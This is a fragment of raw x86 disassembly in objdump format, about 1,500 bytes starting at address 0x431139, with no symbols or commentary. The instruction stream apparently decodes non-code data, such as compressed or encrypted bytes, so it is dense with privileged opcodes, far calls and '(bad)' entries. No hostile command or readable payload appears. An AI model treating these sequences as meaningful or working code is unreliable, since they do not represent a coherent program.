  431139:	14 73                	adc    $0x73,%al
  43113b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  43113c:	ce                   	into
  43113d:	18 e3                	sbb    %ah,%bl
  43113f:	05 a2 5a 70 d0       	add    $0xd0705aa2,%eax
  431144:	3c 11                	cmp    $0x11,%al
  431146:	71 03                	jno    0x43114b
  431148:	e0 7e                	loopne 0x4311c8
  43114a:	38 d2                	cmp    %dl,%dl
  43114c:	5d                   	pop    %ebp
  43114d:	95                   	xchg   %eax,%ebp
  43114e:	2d 38 1d 38 0a       	sub    $0xa381d38,%eax
  431153:	4d                   	dec    %ebp
  431154:	2f                   	das
  431155:	9a ea 75 e6 18 a1 0f 	lcall  $0xfa1,$0x18e675ea
  43115c:	06                   	push   %es
  43115d:	51                   	push   %ecx
  43115e:	c3                   	ret
  43115f:	28 28                	sub    %ch,(%eax)
  431161:	08 d0                	or     %dl,%al
  431163:	0b 31                	or     (%ecx),%esi
  431165:	f9                   	stc
  431166:	85 63 42             	test   %esp,0x42(%ebx)
  431169:	7c 9d                	jl     0x431108
  43116b:	9a af cf 02 6b 97 62 	lcall  $0x6297,$0x6b02cfaf
  431172:	4b                   	dec    %ebx
  431173:	05 fc f1 74 f6       	add    $0xf674f1fc,%eax
  431178:	0d 2b ea 2a 94       	or     $0x942aea2b,%eax
  43117d:	fb                   	sti
  43117e:	9d                   	popf
  43117f:	19 82 ed 33 02 e9    	sbb    %eax,-0x16fdcc13(%edx)
  431185:	bd 03 17 40 38       	mov    $0x38401703,%ebp
  43118a:	cb                   	lret
  43118b:	a2 ed 87 9a 63       	mov    %al,0x639a87ed
  431190:	eb ba                	jmp    0x43114c
  431192:	25 5d 0f 02 68       	and    $0x68020f5d,%eax
  431197:	f2 81 0c 5c 45 71 88 	repnz orl $0xc7887145,(%esp,%ebx,2)
  43119e:	c7 
  43119f:	26 74 85             	es je  0x431127
  4311a2:	9b                   	fwait
  4311a3:	46                   	inc    %esi
  4311a4:	fa                   	cli
  4311a5:	f6 21                	mulb   (%ecx)
  4311a7:	49                   	dec    %ecx
  4311a8:	db 45 48             	fildl  0x48(%ebp)
  4311ab:	e0 20                	loopne 0x4311cd
  4311ad:	b9 3c 88 ca 44       	mov    $0x44ca883c,%ecx
  4311b2:	29 fa                	sub    %edi,%edx
  4311b4:	0e                   	push   %cs
  4311b5:	6d                   	insl   (%dx),%es:(%edi)
  4311b6:	7c 1e                	jl     0x4311d6
  4311b8:	82 76 63 80          	xorb   $0x80,0x63(%esi)
  4311bc:	0a f5                	or     %ch,%dh
  4311be:	24 17                	and    $0x17,%al
  4311c0:	43                   	inc    %ebx
  4311c1:	17                   	pop    %ss
  4311c2:	11 eb                	adc    %ebp,%ebx
  4311c4:	d5 74                	aad    $0x74
  4311c6:	5b                   	pop    %ebx
  4311c7:	26 d1 ac c0 85 64 ea 	shrl   $1,%es:-0x4f159b7b(%eax,%eax,8)
  4311ce:	b0 
  4311cf:	a3 0f 5d b2 bc       	mov    %eax,0xbcb25d0f
  4311d4:	15 29 f1 ce c1       	adc    $0xc1cef129,%eax
  4311d9:	55                   	push   %ebp
  4311da:	f6 c5 32             	test   $0x32,%ch
  4311dd:	83 90 dc d4 20 5b 4d 	adcl   $0x4d,0x5b20d4dc(%eax)
  4311e4:	99                   	cltd
  4311e5:	a1 71 40 02 74       	mov    0x74024071,%eax
  4311ea:	c8 28 8e 92          	enter  $0x8e28,$0x92
  4311ee:	af                   	scas   %es:(%edi),%eax
  4311ef:	0d 46 a9 de eb       	or     $0xebdea946,%eax
  4311f4:	e5 53                	in     $0x53,%eax
  4311f6:	78 70                	js     0x431268
  4311f8:	a8 38                	test   $0x38,%al
  4311fa:	9e                   	sahf
  4311fb:	0e                   	push   %cs
  4311fc:	44                   	inc    %esp
  4311fd:	e2 f0                	loop   0x4311ef
  4311ff:	06                   	push   %es
  431200:	f0 e1 c6             	lock loope 0x4311c9
  431203:	3f                   	aas
  431204:	f7 95 48 f3 00 5f    	notl   0x5f00f348(%ebp)
  43120a:	92                   	xchg   %eax,%edx
  43120b:	a9 a1 5b f3 36       	test   $0x36f35ba1,%eax
  431210:	a8 41                	test   $0x41,%al
  431212:	8a bc 83 d7 e5 e7 dc 	mov    -0x23181a29(%ebx,%eax,4),%bh
  431219:	27                   	daa
  43121a:	b2 cc                	mov    $0xcc,%dl
  43121c:	3f                   	aas
  43121d:	64 33 70 f6          	xor    %fs:-0xa(%eax),%esi
  431221:	3d d0 11 6b 99       	cmp    $0x996b11d0,%eax
  431226:	8b d9                	mov    %ecx,%ebx
  431228:	c0 6b 37 db          	shrb   $0xdb,0x37(%ebx)
  43122c:	ea 6f c0 79 e2 60 b9 	ljmp   $0xb960,$0xe279c06f
  431233:	2b 06                	sub    (%esi),%eax
  431235:	3d 18 ad 61 74       	cmp    $0x7461ad18,%eax
  43123a:	3e 12 fb             	ds adc %bl,%bh
  43123d:	b7 64                	mov    $0x64,%bh
  43123f:	27                   	daa
  431240:	49                   	dec    %ecx
  431241:	68 ce 03 8f 7d       	push   $0x7d8f03ce
  431246:	0b 14 ca             	or     (%edx,%ecx,8),%edx
  431249:	38 8a 6d 7d b8 ad    	cmp    %cl,-0x52478293(%edx)
  43124f:	fe 05 d9 16 7a 80    	incb   0x807a16d9
  431255:	64 78 f9             	fs js  0x431251
  431258:	cb                   	lret
  431259:	f3 94                	repz xchg %eax,%esp
  43125b:	aa                   	stos   %al,%es:(%edi)
  43125c:	40                   	inc    %eax
  43125d:	ea 0a 2e ed d3 0b 37 	ljmp   $0x370b,$0xd3ed2e0a
  431264:	1d 45 ba 39 c0       	sbb    $0xc039ba45,%eax
  431269:	ea 36 86 73 56 a7 64 	ljmp   $0x64a7,$0x56738636
  431270:	ba a9 84 9d e8       	mov    $0xe89d84a9,%edx
  431275:	87 95 14 69 91 17    	xchg   %edx,0x17916914(%ebp)
  43127b:	8a 57 9f             	mov    -0x61(%edi),%dl
  43127e:	55                   	push   %ebp
  43127f:	30 90 2a 08 1d b7    	xor    %dl,-0x48e2f7d6(%eax)
  431285:	fc                   	cld
  431286:	52                   	push   %edx
  431287:	7b db                	jnp    0x431264
  431289:	10 62 e0             	adc    %ah,-0x20(%edx)
  43128c:	81 8d 06 4d d1 af fe 	orl    $0xd6fd2dfe,-0x502eb2fa(%ebp)
  431293:	2d fd d6 
  431296:	6b af 61 59 80 25 6d 	imul   $0x6d,0x25805961(%edi),%ebp
  43129d:	11 c1                	adc    %eax,%ecx
  43129f:	d0 c9                	ror    $1,%cl
  4312a1:	69 a0 9e 09 07 65 6e 	imul   $0x409f7f6e,0x6507099e(%eax),%esp
  4312a8:	7f 9f 40 
  4312ab:	ac                   	lods   %ds:(%esi),%al
  4312ac:	b4 e6                	mov    $0xe6,%ah
  4312ae:	56                   	push   %esi
  4312af:	df b7 56 3a 19 55    	fbstp  0x55193a56(%edi)
  4312b5:	93                   	xchg   %eax,%ebx
  4312b6:	01 c9                	add    %ecx,%ecx
  4312b8:	74 05                	je     0x4312bf
  4312ba:	5b                   	pop    %ebx
  4312bb:	2b d9                	sub    %ecx,%ebx
  4312bd:	df 2d f5 aa 76 2a    	fildll 0x2a76aaf5
  4312c3:	9e                   	sahf
  4312c4:	d6                   	salc
  4312c5:	64 e7 a1             	fs out %eax,$0xa1
  4312c8:	0a 46 94             	or     -0x6c(%esi),%al
  4312cb:	63 d0                	arpl   %edx,%eax
  4312cd:	34 d4                	xor    $0xd4,%al
  4312cf:	ba 80 75 43 e6       	mov    $0xe6437580,%edx
  4312d4:	b3 9e                	mov    $0x9e,%bl
  4312d6:	13 8c 81 0e ab 4c d4 	adc    -0x2bb354f2(%ecx,%eax,4),%ecx
  4312dd:	71 5d                	jno    0x43133c
  4312df:	ad                   	lods   %ds:(%esi),%eax
  4312e0:	f5                   	cmc
  4312e1:	e3 02                	jecxz  0x4312e5
  4312e3:	a1 73 ce d8 35       	mov    0x35d8ce73,%eax
  4312e8:	27                   	daa
  4312e9:	7f c3                	jg     0x4312ae
  4312eb:	8c 14 42             	mov    %ss,(%edx,%eax,2)
  4312ee:	4d                   	dec    %ebp
  4312ef:	66 18 0e             	data16 sbb %cl,(%esi)
  4312f2:	11 76 f1             	adc    %esi,-0xf(%esi)
  4312f5:	0a be f2 59 a0 b0    	or     -0x4f5fa60e(%esi),%bh
  4312fb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4312fc:	ad                   	lods   %ds:(%esi),%eax
  4312fd:	51                   	push   %ecx
  4312fe:	e0 28                	loopne 0x431328
  431300:	ff 2e                	ljmp   *(%esi)
  431302:	7a cf                	jp     0x4312d3
  431304:	ad                   	lods   %ds:(%esi),%eax
  431305:	ad                   	lods   %ds:(%esi),%eax
  431306:	67 7c f4             	addr16 jl 0x4312fd
  431309:	9a a8 87 d5 70 13 be 	lcall  $0xbe13,$0x70d587a8
  431310:	43                   	inc    %ebx
  431311:	c4 6e 93             	les    -0x6d(%esi),%ebp
  431314:	e8 be e4 5d 09       	call   0x9a0f7d7
  431319:	cd 37                	int    $0x37
  43131b:	18 a8 4b d2 25 72    	sbb    %ch,0x7225d24b(%eax)
  431321:	55                   	push   %ebp
  431322:	32 7c d5 16          	xor    0x16(%ebp,%edx,8),%bh
  431326:	2c 15                	sub    $0x15,%al
  431328:	ee                   	out    %al,(%dx)
  431329:	e4 16                	in     $0x16,%al
  43132b:	1a 04 8a             	sbb    (%edx,%ecx,4),%al
  43132e:	c6 87 55 30 1f b6 9c 	movb   $0x9c,-0x49e0cfab(%edi)
  431335:	70 03                	jo     0x43133a
  431337:	17                   	pop    %ss
  431338:	68 5d f3 d1 4d       	push   $0x4dd1f35d
  43133d:	d0 72 34             	shlb   $1,0x34(%edx)
  431340:	23 a3 1e 60 ae ed    	and    -0x12519fe2(%ebx),%esp
  431346:	e3 96                	jecxz  0x4312de
  431348:	9c                   	pushf
  431349:	11 02                	adc    %eax,(%edx)
  43134b:	78 c3                	js     0x431310
  43134d:	d3 50 d8             	rcll   %cl,-0x28(%eax)
  431350:	6e                   	outsb  %ds:(%esi),(%dx)
  431351:	f9                   	stc
  431352:	e1 98                	loope  0x4312ec
  431354:	0d e4 d5 65 e1       	or     $0xe165d5e4,%eax
  431359:	0d 6b 72 8d ac       	or     $0xac8d726b,%eax
  43135e:	61                   	popa
  43135f:	86 c9                	xchg   %cl,%cl
  431361:	4f                   	dec    %edi
  431362:	da 1f                	ficompl (%edi)
  431364:	ed                   	in     (%dx),%eax
  431365:	39 e6                	cmp    %esp,%esi
  431367:	13 21                	adc    (%ecx),%esp
  431369:	db f8                	(bad)
  43136b:	95                   	xchg   %eax,%ebp
  43136c:	0c b3                	or     $0xb3,%al
  43136e:	18 29                	sbb    %ch,(%ecx)
  431370:	4a                   	dec    %edx
  431371:	c9                   	leave
  431372:	6c                   	insb   (%dx),%es:(%edi)
  431373:	1b 79 9a             	sbb    -0x66(%ecx),%edi
  431376:	28 7f 64             	sub    %bh,0x64(%edi)
  431379:	e7 e8                	out    %eax,$0xe8
  43137b:	d4 76                	aam    $0x76
  43137d:	46                   	inc    %esi
  43137e:	84 0a                	test   %cl,(%edx)
  431380:	2f                   	das
  431381:	29 79 63             	sub    %edi,0x63(%ecx)
  431384:	b6 e0                	mov    $0xe0,%dh
  431386:	8d 5c d9 9e          	lea    -0x62(%ecx,%ebx,8),%ebx
  43138a:	89 ff                	mov    %edi,%edi
  43138c:	9e                   	sahf
  43138d:	0d cd e2 95 3f       	or     $0x3f95e2cd,%eax
  431392:	a9 44 45 99 0b       	test   $0xb994544,%eax
  431397:	74 e4                	je     0x43137d
  431399:	cc                   	int3
  43139a:	37                   	aaa
  43139b:	fc                   	cld
  43139c:	b0 39                	mov    $0x39,%al
  43139e:	97                   	xchg   %eax,%edi
  43139f:	02 5f 02             	add    0x2(%edi),%bl
  4313a2:	c2 a1 55             	ret    $0x55a1
  4313a5:	e0 be                	loopne 0x431365
  4313a7:	e0 cf                	loopne 0x431378
  4313a9:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4313aa:	43                   	inc    %ebx
  4313ab:	92                   	xchg   %eax,%edx
  4313ac:	ac                   	lods   %ds:(%esi),%al
  4313ad:	62 02                	bound  %eax,(%edx)
  4313af:	f1                   	int1
  4313b0:	98                   	cwtl
  4313b1:	0a 15 3f d4 c2 22    	or     0x22c2d43f,%dl
  4313b7:	41                   	inc    %ecx
  4313b8:	4a                   	dec    %edx
  4313b9:	95                   	xchg   %eax,%ebp
  4313ba:	2e 61                	cs popa
  4313bc:	84 e1                	test   %ah,%cl
  4313be:	11 69 04             	adc    %ebp,0x4(%ecx)
  4313c1:	c6 00 14             	movb   $0x14,(%eax)
  4313c4:	7b 6d                	jnp    0x431433
  4313c6:	f0 22 78 b4          	lock and -0x4c(%eax),%bh
  4313ca:	33 0b                	xor    (%ebx),%ecx
  4313cc:	a9 1b 33 dd 32       	test   $0x32dd331b,%eax
  4313d1:	2f                   	das
  4313d2:	ac                   	lods   %ds:(%esi),%al
  4313d3:	03 5a eb             	add    -0x15(%edx),%ebx
  4313d6:	16                   	push   %ss
  4313d7:	8f                   	(bad)
  4313d8:	24 91                	and    $0x91,%al
  4313da:	10 8f ed b1 9a e0    	adc    %cl,-0x1f654e13(%edi)
  4313e0:	97                   	xchg   %eax,%edi
  4313e1:	41                   	inc    %ecx
  4313e2:	f3 92                	repz xchg %eax,%edx
  4313e4:	72 da                	jb     0x4313c0
  4313e6:	a3 ff c1 10 36       	mov    %eax,0x3610c1ff
  4313eb:	85 59 c8             	test   %ebx,-0x38(%ecx)
  4313ee:	3e 4d                	ds dec %ebp
  4313f0:	e6 eb                	out    %al,$0xeb
  4313f2:	78 2d                	js     0x431421
  4313f4:	ca 32 62             	lret   $0x6232
  4313f7:	4e                   	dec    %esi
  4313f8:	ac                   	lods   %ds:(%esi),%al
  4313f9:	8b 3a                	mov    (%edx),%edi
  4313fb:	e0 bb                	loopne 0x4313b8
  4313fd:	3f                   	aas
  4313fe:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4313ff:	1f                   	pop    %ds
  431400:	95                   	xchg   %eax,%ebp
  431401:	29 5e de             	sub    %ebx,-0x22(%esi)
  431404:	b2 9a                	mov    $0x9a,%dl
  431406:	a1 34 d6 6b 81       	mov    0x816bd634,%eax
  43140b:	98                   	cwtl
  43140c:	7f e3                	jg     0x4313f1
  43140e:	7e 4e                	jle    0x43145e
  431410:	4c                   	dec    %esp
  431411:	85 b0 e2 f0 25 e6    	test   %esi,-0x19da0f1e(%eax)
  431417:	0f ec 1c 42          	paddsb (%edx,%eax,2),%mm3
  43141b:	06                   	push   %es
  43141c:	b5 77                	mov    $0x77,%ch
  43141e:	0c 3a                	or     $0x3a,%al
  431420:	9a 30 3a ee dd e3 bc 	lcall  $0xbce3,$0xddee3a30
  431427:	84 fc                	test   %bh,%ah
  431429:	9c                   	pushf
  43142a:	24 7e                	and    $0x7e,%al
  43142c:	55                   	push   %ebp
  43142d:	9d                   	popf
  43142e:	80 fc 39             	cmp    $0x39,%ah
  431431:	bf a2 c7 4a eb       	mov    $0xeb4ac7a2,%edi
  431436:	41                   	inc    %ecx
  431437:	91                   	xchg   %eax,%ecx
  431438:	f8                   	clc
  431439:	9c                   	pushf
  43143a:	74 0f                	je     0x43144b
  43143c:	ff b6 db 98 63 c3    	push   -0x3c9c6725(%esi)
  431442:	1d 53 c6 07 43       	sbb    $0x4307c653,%eax
  431447:	19 64 77 0e          	sbb    %esp,0xe(%edi,%esi,2)
  43144b:	15 a2 95 1c e2       	adc    $0xe21c95a2,%eax
  431450:	59                   	pop    %ecx
  431451:	dc c6                	fadd   %st,%st(6)
  431453:	72 02                	jb     0x431457
  431455:	ca f9 e5             	lret   $0xe5f9
  431458:	12 cd                	adc    %ch,%cl
  43145a:	46                   	inc    %esi
  43145b:	aa                   	stos   %al,%es:(%edi)
  43145c:	c5 9e b5 16 b6 62    	lds    0x62b616b5(%esi),%ebx
  431462:	24 b5                	and    $0xb5,%al
  431464:	cf                   	iret
  431465:	60                   	pusha
  431466:	a1 a9 1a d5 41       	mov    0x41d51aa9,%eax
  43146b:	21 ed                	and    %ebp,%ebp
  43146d:	14 27                	adc    $0x27,%al
  43146f:	ab                   	stos   %eax,%es:(%edi)
  431470:	43                   	inc    %ebx
  431471:	7f ee                	jg     0x431461
  431473:	65 39 8c 71 56 f0 8c 	cmp    %ecx,%gs:0x398cf056(%ecx,%esi,2)
  43147a:	39 
  43147b:	d6                   	salc
  43147c:	08 13                	or     %dl,(%ebx)
  43147e:	95                   	xchg   %eax,%ebp
  43147f:	e1 0d                	loope  0x43148e
  431481:	cb                   	lret
  431482:	15 f5 84 bf ed       	adc    $0xedbf84f5,%eax
  431487:	c2 9a 28             	ret    $0x289a
  43148a:	2e 25 d0 05 75 ac    	cs and $0xac7505d0,%eax
  431490:	aa                   	stos   %al,%es:(%edi)
  431491:	13 55 4d             	adc    0x4d(%ebp),%edx
  431494:	27                   	daa
  431495:	5b                   	pop    %ebx
  431496:	b3 ef                	mov    $0xef,%bl
  431498:	b4 14                	mov    $0x14,%ah
  43149a:	2d a2 ee 18 67       	sub    $0x6718eea2,%eax
  43149f:	0a eb                	or     %bl,%ch
  4314a1:	32 a1 1c 0e 48 ee    	xor    -0x11b7f1e4(%ecx),%ah
  4314a7:	66 02 4e 24          	data16 add 0x24(%esi),%cl
  4314ab:	39 4c 71 cd          	cmp    %ecx,-0x33(%ecx,%esi,2)
  4314af:	47                   	inc    %edi
  4314b0:	70 1c                	jo     0x4314ce
  4314b2:	48                   	dec    %eax
  4314b3:	87 17                	xchg   %edx,(%edi)
  4314b5:	87 1d 8d 0c 51 f6    	xchg   %ebx,0xf6510c8d
  4314bb:	88 94 9b ba 3a ce 8e 	mov    %dl,-0x7131c546(%ebx,%ebx,4)
  4314c2:	3b 22                	cmp    (%edx),%esp
  4314c4:	97                   	xchg   %eax,%edi
  4314c5:	99                   	cltd
  4314c6:	a2 c6 60 f0 3f       	mov    %al,0x3ff060c6
  4314cb:	87 3f                	xchg   %edi,(%edi)
  4314cd:	7f 93                	jg     0x431462
  4314cf:	85 07                	test   %eax,(%edi)
  4314d1:	7a ba                	jp     0x43148d
  4314d3:	28 e3                	sub    %ah,%bl
  4314d5:	57                   	push   %edi
  4314d6:	89 ee                	mov    %ebp,%esi
  4314d8:	17                   	pop    %ss
  4314d9:	2c f0                	sub    $0xf0,%al
  4314db:	2e a9 ba e3 ec e6    	cs test $0xe6ece3ba,%eax
  4314e1:	da f5                	(bad)
  4314e3:	81 9b 5a 82 32 a5 94 	sbbl   $0x9fd99b94,-0x5acd7da6(%ebx)
  4314ea:	9b d9 9f 
  4314ed:	fb                   	sti
  4314ee:	aa                   	stos   %al,%es:(%edi)
  4314ef:	f2 b7 e3             	repnz mov $0xe3,%bh
  4314f2:	dd 5e 04             	fstpl  0x4(%esi)
  4314f5:	dd d9                	fstp   %st(1)
  4314f7:	d7                   	xlat   %ds:(%ebx)
  4314f8:	72 08                	jb     0x431502
  4314fa:	54                   	push   %esp
  4314fb:	6a 11                	push   $0x11
  4314fd:	bc 5c 75 d0 dd       	mov    $0xddd0755c,%esp
  431502:	35 3a 35 75 16       	xor    $0x1675353a,%eax
  431507:	8b 93 91 99 50 ef    	mov    -0x10af666f(%ebx),%edx
  43150d:	7e 4e                	jle    0x43155d
  43150f:	68 3b 9d 1b 9c       	push   $0x9c1b9d3b
  431514:	7b 2b                	jnp    0x431541
  431516:	7c a2                	jl     0x4314ba
  431518:	f3 85 47 24          	repz test %eax,0x24(%edi)
  43151c:	81 44 fb e7 18 36 ad 	addl   $0x71ad3618,-0x19(%ebx,%edi,8)
  431523:	71 
  431524:	4f                   	dec    %edi
  431525:	ef                   	out    %eax,(%dx)
  431526:	6c                   	insb   (%dx),%es:(%edi)
  431527:	2a c9                	sub    %cl,%cl
  431529:	e1 28                	loope  0x431553
  43152b:	31 6d fa             	xor    %ebp,-0x6(%ebp)
  43152e:	08 d3                	or     %dl,%bl
  431530:	cf                   	iret
  431531:	6a 9c                	push   $0xffffff9c
  431533:	90                   	nop
  431534:	76 40                	jbe    0x431576
  431536:	44                   	inc    %esp
  431537:	7e 2f                	jle    0x431568
  431539:	96                   	xchg   %eax,%esi
  43153a:	f6 b9 73 1c ee fb    	idivb  -0x411e38d(%ecx)
  431540:	64 3d f9 8a e1 43    	fs cmp $0x43e18af9,%eax
  431546:	8f 83 16 62 94 b5    	pop    -0x4a6b9dea(%ebx)
  43154c:	3d 8c 4c 96 29       	cmp    $0x29964c8c,%eax
  431551:	51                   	push   %ecx
  431552:	d8 8b 17 b8 35 cc    	fmuls  -0x33ca47e9(%ebx)
  431558:	75 73                	jne    0x4315cd
  43155a:	84 11                	test   %dl,(%ecx)
  43155c:	8f                   	(bad)
  43155d:	f7 7c d5 a5          	idivl  -0x5b(%ebp,%edx,8)
  431561:	77 19                	ja     0x43157c
  431563:	b5 68                	mov    $0x68,%ch
  431565:	49                   	dec    %ecx
  431566:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  431567:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  431568:	52                   	push   %edx
  431569:	ea 82 cc 8a 62 3c 46 	ljmp   $0x463c,$0x628acc82
  431570:	4e                   	dec    %esi
  431571:	45                   	inc    %ebp
  431572:	55                   	push   %ebp
  431573:	5e                   	pop    %esi
  431574:	35 3a ce 8e 2f       	xor    $0x2f8ece3a,%eax
  431579:	6b e9 f2             	imul   $0xfffffff2,%ecx,%ebp
  43157c:	73 1c                	jae    0x43159a
  43157e:	f4                   	hlt
  43157f:	26 41                	es inc %ecx
  431581:	9e                   	sahf
  431582:	fd                   	std
  431583:	b3 14                	mov    $0x14,%bl
  431585:	d5 4f                	aad    $0x4f
  431587:	df 75 d9             	fbstp  -0x27(%ebp)
  43158a:	4e                   	dec    %esi
  43158b:	1f                   	pop    %ds
  43158c:	d9 80 d3 14 6b 79    	flds   0x796b14d3(%eax)
  431592:	23 a3 36 68 ea fd    	and    -0x21597ca(%ebx),%esp
  431598:	6b c3 a5             	imul   $0xffffffa5,%ebx,%eax
  43159b:	2b d8                	sub    %eax,%ebx
  43159d:	33 03                	xor    (%ebx),%eax
  43159f:	45                   	inc    %ebp
  4315a0:	04 31                	add    $0x31,%al
  4315a2:	67 03 91 bf 9d       	add    -0x6241(%bx,%di),%edx
  4315a7:	a9 49 0f a9 11       	test   $0x11a90f49,%eax
  4315ac:	34 7e                	xor    $0x7e,%al
  4315ae:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4315af:	18 d5                	sbb    %dl,%ch
  4315b1:	45                   	inc    %ebp
  4315b2:	5b                   	pop    %ebx
  4315b3:	cb                   	lret
  4315b4:	55                   	push   %ebp
  4315b5:	7d 6e                	jge    0x431625
  4315b7:	bf 1f 52 2c 9a       	mov    $0x9a2c521f,%edi
  4315bc:	55                   	push   %ebp
  4315bd:	19 e1                	sbb    %esp,%ecx
  4315bf:	a1 05 b1 7b 12       	mov    0x127bb105,%eax
  4315c4:	8d a4 fe 62 cc ad e2 	lea    -0x1d52339e(%esi,%edi,8),%esp
  4315cb:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4315cc:	a3 88 b7 a1 fb       	mov    %eax,0xfba1b788
  4315d1:	11 05 1e e7 b2 39    	adc    %eax,0x39b2e71e
  4315d7:	4f                   	dec    %edi
  4315d8:	2a 62 b5             	sub    -0x4b(%edx),%ah
  4315db:	c0 be a1 c6 c5 c4 ef 	sarb   $0xef,-0x3b3a395f(%esi)
  4315e2:	16                   	push   %ss
  4315e3:	ba 5e 42 26 25       	mov    $0x2526425e,%edx
  4315e8:	8a 6f 7a             	mov    0x7a(%edi),%ch
  4315eb:	92                   	xchg   %eax,%edx
  4315ec:	4c                   	dec    %esp
  4315ed:	d1 69 93             	shrl   $1,-0x6d(%ecx)
  4315f0:	ce                   	into
  4315f1:	a9 c9 4e 5f d4       	test   $0xd45f4ec9,%eax
  4315f6:	da 3b                	fidivrl (%ebx)
  4315f8:	1d 41 2b bd 21       	sbb    $0x21bd2b41,%eax
  4315fd:	5c                   	pop    %esp
  4315fe:	41                   	inc    %ecx
  4315ff:	bd 21 ee 1f d0       	mov    $0xd01fee21,%ebp
  431604:	dc 68 43             	fsubrl 0x43(%eax)
  431607:	99                   	cltd
  431608:	a3 ac 10 fc 36       	mov    %eax,0x36fc10ac
  43160d:	d7                   	xlat   %ds:(%ebx)
  43160e:	48                   	dec    %eax
  43160f:	c8 90 47 12          	enter  $0x4790,$0x12
  431613:	9a f6 56 d8 95 71 1d 	lcall  $0x1d71,$0x95d856f6
  43161a:	0c 9e                	or     $0x9e,%al
  43161c:	1c 90                	sbb    $0x90,%al
  43161e:	7a df                	jp     0x4315ff
  431620:	6f                   	outsl  %ds:(%esi),(%dx)
  431621:	f5                   	cmc
  431622:	eb f9                	jmp    0x43161d
  431624:	50                   	push   %eax
  431625:	83 db be             	sbb    $0xffffffbe,%ebx
  431628:	e7 9b                	out    %eax,$0x9b
  43162a:	85 5e e9             	test   %ebx,-0x17(%esi)
  43162d:	83 70 bc 71          	xorl   $0x71,-0x44(%eax)
  431631:	93                   	xchg   %eax,%ebx
  431632:	d2 54 70 fb          	rclb   %cl,-0x5(%eax,%esi,2)
  431636:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  431637:	3e 62 a3 d8 ff bf 8a 	bound  %esp,%ds:-0x75400028(%ebx)
  43163e:	6b b8 2e cf f1 f4 82 	imul   $0xffffff82,-0xb0e30d2(%eax),%edi
  431645:	52                   	push   %edx
  431646:	df 94 87 e2 c0 d9 96 	fists  -0x69263f1e(%edi,%eax,4)
  43164d:	ca 38 7d             	lret   $0x7d38
  431650:	c8 8b 59 2b          	enter  $0x598b,$0x2b
  431654:	0e                   	push   %cs
  431655:	4a                   	dec    %edx
  431656:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  431657:	60                   	pusha
  431658:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  431659:	cf                   	iret
  43165a:	db 96 c8 c3 61 35    	fistl  0x3561c3c8(%esi)
  431660:	ee                   	out    %al,(%dx)
  431661:	6b fd e5             	imul   $0xffffffe5,%ebp,%edi
  431664:	6d                   	insl   (%dx),%es:(%edi)
  431665:	fb                   	sti
  431666:	20 95 ed aa 11 05    	and    %dl,0x511aaed(%ebp)
  43166c:	11 78 be             	adc    %edi,-0x42(%eax)
  43166f:	1e                   	push   %ds
  431670:	b7 f8                	mov    $0xf8,%bh
  431672:	9c                   	pushf
  431673:	aa                   	stos   %al,%es:(%edi)
  431674:	68 62 27 b9 f0       	push   $0xf0b92762
  431679:	12 e3                	adc    %bl,%ah
  43167b:	25 bb d7 0a a9       	and    $0xa90ad7bb,%eax
  431680:	da 42 fd             	fiaddl -0x3(%edx)
  431683:	81 ee 2c 62 01 20    	sub    $0x2001622c,%esi
  431689:	8a 64 a1 66          	mov    0x66(%ecx,%eiz,4),%ah
  43168d:	3e a6                	cmpsb  %es:(%edi),%ds:(%esi)
  43168f:	58                   	pop    %eax
  431690:	2e 98                	cs cwtl
  431692:	0b 3b                	or     (%ebx),%edi
  431694:	03 20                	add    (%eax),%esp
  431696:	ed                   	in     (%dx),%eax
  431697:	e4 15                	in     $0x15,%al
  431699:	42                   	inc    %edx
  43169a:	2e c4 23             	les    %cs:(%ebx),%esp
  43169d:	2f                   	das
  43169e:	d8 01                	fadds  (%ecx)
  4316a0:	27                   	daa
  4316a1:	b5 d4                	mov    $0xd4,%ch
  4316a3:	e6 8b                	out    %al,$0x8b
  4316a5:	17                   	pop    %ss
  4316a6:	89 14 89             	mov    %edx,(%ecx,%ecx,4)
  4316a9:	d2 2d c7 73 7c d8    	shrb   %cl,0xd87c73c7
  4316af:	fb                   	sti
  4316b0:	fc                   	cld
  4316b1:	d5 65                	aad    $0x65
  4316b3:	36 a1 1c 97 fb 66    	mov    %ss:0x66fb971c,%eax
  4316b9:	d5 98                	aad    $0x98
  4316bb:	b6 d7                	mov    $0xd7,%dh
  4316bd:	a1 b6 8b 4e fd       	mov    0xfd4e8bb6,%eax
  4316c2:	8a 56 e8             	mov    -0x18(%esi),%dl
  4316c5:	3b 42 99             	cmp    -0x67(%edx),%eax
  4316c8:	b6 46                	mov    $0x46,%dh
  4316ca:	a9 a2 ae 13 76       	test   $0x7613aea2,%eax
  4316cf:	07                   	pop    %es
  4316d0:	57                   	push   %edi
  4316d1:	65 74 68             	gs je  0x43173c
  4316d4:	68 68 39 1c e0       	push   $0xe01c3968
  4316d9:	ff 6d 67             	ljmp   *0x67(%ebp)
  4316dc:	63 ec                	arpl   %ebp,%esp
  4316de:	08 75 0a             	or     %dh,0xa(%ebp)
  4316e1:	b9 62 8a 49 3c       	mov    $0x3c498a62,%ecx
  4316e6:	66 2c 27             	data16 sub $0x27,%al
  4316e9:	46                   	inc    %esi
  4316ea:	d4 09                	aam    $0x9
  4316ec:	de ce                	fmulp  %st,%st(6)
  4316ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4316ef:	c4 a2 cf 23 2d b9    	les    -0x46d2dc31(%edx),%esp
  4316f5:	42                   	inc    %edx
  4316f6:	54                   	push   %esp
  4316f7:	c1 c3 af             	rol    $0xaf,%ebx
  4316fa:	18 f9                	sbb    %bh,%cl
  4316fc:	6c                   	insb   (%dx),%es:(%edi)
  4316fd:	ae                   	scas   %es:(%edi),%al
  4316fe:	1e                   	push   %ds
  4316ff:	a8 5e                	test   $0x5e,%al
  431701:	7a 8a                	jp     0x43168d
  431703:	a9 0e a4 6f 26       	test   $0x266fa40e,%eax
  431708:	89 e0                	mov    %esp,%eax
  43170a:	06                   	push   %es
  43170b:	f2 ec                	repnz in (%dx),%al
